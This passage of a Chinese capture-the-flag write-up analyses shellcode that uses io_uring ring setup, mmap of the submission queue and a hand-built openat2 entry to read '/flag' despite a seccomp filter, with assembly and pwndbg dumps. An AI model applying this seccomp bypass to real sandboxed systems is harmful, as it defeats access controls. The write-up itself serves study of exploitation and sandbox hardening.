mov edx,DWORD PTR [rdi+0x40]
add edx,0x1
mov DWORD PTR [rdi+0x40],edx
mov DWORD PTR [r10],eax
mov rdx,QWORD PTR [rdi]
sub eax,DWORD PTR [rdx]
xor edx,edx
mov esi,eax
mov eax,DWORD PTR [rdi+0xc0]
mov ecx,eax
and ecx,0x2
mov r8d,ecx
or r8d,0x1
test al,0x1
cmovne ecx,r8d
mov edi,DWORD PTR [rdi+0xc4]
mov r9,r8
mov r8d,ecx
mov ecx,edx
mov edx,esi
mov esi,edi
mov edi,0x1aa
push r15
push 0x8
call syscall_func
pop rdx
pop rcx
pop r15
ret
```

`io_uring_get_cqe`函数的处理方式与上面一个函数类似，也是将其扁平化。

下面我们主要分析一下最前面执行的这一大段shellcode的功能。需要注意的是，原exp中是将'/flag'字符串放在了这段shellcode后面，对应于这一页中偏移为0x3F9的地址。

第一次进行系统调用是`io_uring_setup`，需要2个参数，第1个参数设置提交队列和完成队列的队列项数，传入的参数是1，第2个参数是一个`io_uring_params`结构体实例，这里传入一个被0清空的栈空间。执行系统调用后，返回的文件描述符为3，这个结构体的内容发生改变：

```text
pwndbg> tele 0x7fff373c83e8
00:0000│ rsi rbp 0x7fff373c83e8 ◂— 0x200000001
01:0008│         0x7fff373c83f0 ◂— 0x0
02:0010│         0x7fff373c83f8 ◂— 0x1fff00000000
03:0018│         0x7fff373c8400 ◂— 0x0
04:0020│         0x7fff373c8408 ◂— 0x0
05:0028│         0x7fff373c8410 ◂— 0x4000000000
06:0030│         0x7fff373c8418 ◂— 0x10800000100
07:0038│         0x7fff373c8420 ◂— 0x11000000114
08:0040│  0x7fff373c8428 ◂— 0x180
09:0048│  0x7fff373c8430 ◂— 0x0
0a:0050│  0x7fff373c8438 ◂— 0xc000000080
0b:0058│  0x7fff373c8440 ◂— 0x10c00000104
0c:0060│  0x7fff373c8448 ◂— 0x1400000011c
0d:0068│  0x7fff373c8450 ◂— 0x118
0e:0070│  0x7fff373c8458 ◂— 0x0
0f:0078│  0x7fff373c8460 ◂— 0x0

struct io_uring_params {
	__u32 sq_entries;                   // 1
	__u32 cq_entries;                   // 2
	__u32 flags;                        // 0
	__u32 sq_thread_cpu;                // 0
	__u32 sq_thread_idle;               // 0
	__u32 features;                     // 0x1FFF
	__u32 wq_fd;                        // 0
	__u32 resv[3];                      // 0, 0, 0
	struct io_sqring_offsets {
        __u32 head;                     // 0
        __u32 tail;                     // 0x40
        __u32 ring_mask;                // 0x100
        __u32 ring_entries;             // 0x108
        __u32 flags;                    // 0x114
        __u32 dropped;                  // 0x110
        __u32 array;                    // 0x180
        __u32 resv1;                    // 0
        __u64 user_addr;                // 0
    }sq_off;
	struct io_cqring_offsets {
        __u32 head;                     // 0x80
        __u32 tail;                     // 0xC0
        __u32 ring_mask;                // 0x104
        __u32 ring_entries;             // 0x10C
        __u32 overflow;                 // 0x11C
        __u32 cqes;                     // 0x140
        __u32 flags;                    // 0x118
        __u32 resv1;                    // 0
        __u64 user_addr;                // 0
    }cq_off;
};
```

可以看到，这里保存了SQE、CQE的一些项在内核页中的偏移，接下来我们只需要通过`mmap`，设置fd为3即可将这个内核页共享到用户空间。

下面的`mmap64`的参数分别为：
```text
unsigned long addr = 0
unsigned long len = 0x184
unsigned long prot = 3 (PROT_READ | PROT_WRITE)
unsigned long flags = 0x8001 (MAP_POPULATE | MAP_SHARED)
unsigned long fd = 3
unsigned long off = 0
```

`mmap`之后，将会返回一个0x1000的内存空间，这段内存空间即使在gdb中也无法进行读取。

后面紧跟着一个循环6次的loop1循环，其作用是将CQE和SQE的相关地址保存到栈中。然后又是一个mmap，参数为：

```text
unsigned long addr = 0
unsigned long len = 0x40
unsigned long prot = 3 (PROT_READ | PROT_WRITE)
unsigned long flags = 0x8001 (MAP_POPULATE | MAP_SHARED)
unsigned long fd = 3
unsigned long off = 0x10000000
```

获取了一个offset为0x10000000，大小为一页的内存空间。通过查询源码得知，这是`io_uring_mmap`的一部分：

```c
#define IORING_OFF_SQ_RING		0ULL
#define IORING_OFF_CQ_RING		0x8000000ULL
#define IORING_OFF_SQES			0x10000000ULL
#define IORING_OFF_PBUF_RING		0x80000000ULL
#define IORING_OFF_PBUF_SHIFT		16
#define IORING_OFF_MMAP_MASK		0xf8000000ULL
```

可以看到内核这里预先定义了偏移，所以通过`mmap`设置偏移为`IORING_OFF_SQES`实际上也就是获取了SQE，即提交队列中的所有项的保存位置。然后，通过调用`io_uring_get_sqe`获取提交队列项，手动将`openat2`的opcode（0x1C）以及其他的参数保存到sqe中，在上面的shellcode里面是提交的openat2，实际上`openat`也是完全没问题的。随后使用`io_uring_submit`提交任务，使用`io_uring_get_cqe`获取完成队列中该任务完成的结果，返回一个文件描述符4。后面的读与写和打开类似，也是这样的流程。因此在最后一次调用`io_uring_get_cqe`时，能够直接输出。不过这个输出也是有概率的，多试几次必然能够输出内容。

以上就是使用`io_uring`异步输出系统绕过seccomp进行文件读写的分析。当然`io_uring`本身的功能是我们在开发过程中实际上更应该重视的。